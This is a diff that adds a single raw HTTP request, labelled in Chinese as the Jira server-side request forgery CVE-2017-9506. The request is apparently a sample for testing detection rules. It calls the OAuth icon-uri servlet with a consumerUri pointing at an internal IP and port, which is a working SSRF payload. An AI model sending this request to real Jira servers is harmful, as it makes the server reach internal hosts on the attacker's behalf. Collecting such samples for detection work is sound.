@@ -1,0 +1,10 @@
+# Atlassian Jira 服务端请求伪造漏洞 (CVE-2017-9506)
+GET /wzbb/plugins/servlet/oauth/users/icon-uri?consumerUri=http://10.196.165.54:12345/i/8a723f/5wu5/v303/ HTTP/1.1
+Host: www.testrule.com:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0
+Accept: */*
+Referer: http://219.140.126.103:8090/login.jsp
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
